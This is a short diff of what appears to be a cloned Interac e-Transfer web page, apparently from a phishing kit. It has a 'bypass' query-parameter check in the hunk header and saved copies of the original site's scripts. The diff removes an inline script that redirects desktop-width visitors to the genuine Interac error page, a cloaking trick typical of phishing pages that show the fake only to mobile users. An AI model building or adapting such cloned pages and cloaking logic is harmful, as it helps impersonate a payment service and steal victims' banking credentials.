@@ -519,4 +519,4 @@ if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
         </span>
     
 
-<span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span><span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span><div id="automa-palette"></div><script type="text/javascript" async="" src="./files/generic1577468500768.js(1)###%" charset="UTF-8"></script><span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
+<span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span><span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span><div id="automa-palette"></div><script type="text/javascript" async="" src="./files/generic1577468500768.js(1)###%" charset="UTF-8"></script><span><div id="KampyleAnimationContainer" style="z-index: 2147483000"></div></span></body></html>
